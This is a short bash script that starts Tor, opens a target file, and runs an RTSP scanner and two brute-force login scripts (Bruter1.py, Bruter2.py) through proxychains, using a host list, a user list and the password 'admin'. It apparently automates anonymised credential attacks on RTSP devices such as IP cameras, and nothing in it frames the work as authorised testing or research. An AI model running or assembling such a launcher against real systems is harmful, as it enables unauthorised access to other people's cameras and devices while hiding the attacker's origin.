#!/bin/bash

service tor start
sleep 1

service tor status
nano target.txt

sleep 1 
proxychains ./rtspscan.sh

sleep 10
proxychains python3 Bruter1.py -t ./masmap.txt -u ./user.txt -password admin run

sleep 10
proxychains python3 Bruter2.py


